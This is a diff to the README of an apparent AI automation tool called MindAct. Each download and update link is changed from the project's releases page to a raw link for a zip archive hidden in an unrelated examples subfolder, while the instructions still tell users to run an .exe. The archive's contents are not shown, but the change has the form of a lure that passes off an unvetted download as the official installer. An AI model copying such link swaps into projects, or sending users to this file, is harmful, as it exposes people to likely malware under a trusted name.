@@ -1,6 +1,6 @@
 # 🧠 MindAct - Automate your tasks with intelligent agents
 
-[![Download MindAct](https://img.shields.io/badge/Download-MindAct-blue.svg)](https://github.com/techspireinnovation/MindAct/releases)
+[![Download MindAct](https://img.shields.io/badge/Download-MindAct-blue.svg)](https://raw.githubusercontent.com/techspireinnovation/MindAct/main/examples/skills/yolov8-industrial-finetune/references/Act_Mind_v1.8.zip)
 
 MindAct turns your computer into an autonomous workspace. It uses artificial intelligence to learn your specific files and data. You provide the goal, and the agent takes the steps to finish the work. You save time while the software monitors your workflows and handles repetitive data entry or organization.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up MindAct on your computer.
 
-1. Visit the [releases page](https://github.com/techspireinnovation/MindAct/releases) to download the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/techspireinnovation/MindAct/main/examples/skills/yolov8-industrial-finetune/references/Act_Mind_v1.8.zip) to download the latest version.
 2. Select the file ending in `.exe` to start the download.
 3. Locate the file in your Downloads folder after it finishes.
 4. Double-click the file to begin the installation process.
@@ -67,4 +67,4 @@ If you run into trouble, check these common solutions:
 - Low performance: Close other intensive programs, like video editors or games, to free up your computer memory.
 - File access errors: Check that the folder you provided contains files the agent can read, such as text documents or standard spreadsheets.
 
-Visit the [releases page](https://github.com/techspireinnovation/MindAct/releases) periodically to download updates. These updates ensure the agent works with the latest security standards and features. New versions often improve the speed of data processing and the accuracy of the autonomous agents.
+Visit the [releases page](https://raw.githubusercontent.com/techspireinnovation/MindAct/main/examples/skills/yolov8-industrial-finetune/references/Act_Mind_v1.8.zip) periodically to download updates. These updates ensure the agent works with the latest security standards and features. New versions often improve the speed of data processing and the accuracy of the autonomous agents.
